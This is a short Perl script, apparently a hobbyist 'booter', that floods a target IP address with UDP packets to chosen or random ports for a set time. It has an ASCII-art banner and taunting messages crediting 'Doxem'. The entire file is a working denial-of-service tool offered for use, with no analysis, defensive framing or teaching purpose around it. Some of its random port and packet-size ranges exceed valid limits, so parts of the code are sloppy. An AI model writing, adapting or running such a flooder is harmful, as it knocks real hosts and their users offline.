#!/usr/bin/perl
 
##
# PwNy<----
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print <<EOTEXT;
 
oooooo   oooooo     oooo  o8o  oooooooooooo  o8o  
 `888.    `888.     .8'   `"'  `888'     `8  `"'  
  `888.   .8888.   .8'   oooo   888         oooo  
   `888  .8'`888. .8'    `888   888oooo8    `888  
    `888.8'  `888.8'      888   888    "     888  
     `888'    `888'       888   888          888  
      `8'      `8'       o888o o888o        o888o
 
ooooo      ooo  o8o  ooooooo  ooooo
`888b.     `8'  `"'   `8888    d8'  
 8 `88b.    8  oooo     Y888..8P    
 8   `88b.  8  `888      `8888'    
 8     `88b.8   888     .8PY888.    
 8       `888   888    d8'  `888b  
o8o        `8  o888o o888o  o88888o
 
 Welcome to Doxem NIX<3 - WhEn IN DoUbt KnoCk Em OuT, gEt SmAcKeD ChEeSe
DiCk DoS Coded by:Doxem
EOTEXT
 
print "~Doxem  NiX ShiT oN~ $ip " . ($port ? $port : "random") . "
ResPecT WiFi" .
  ($size ? "$size-byte" : "THIS BOOUTER DONT WORK :(...O SHIT CALL 911 HIS MODEM ON FIRE!!") . "
~Doxem~ ~i'LL SlAp TiLL YoU CrY~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
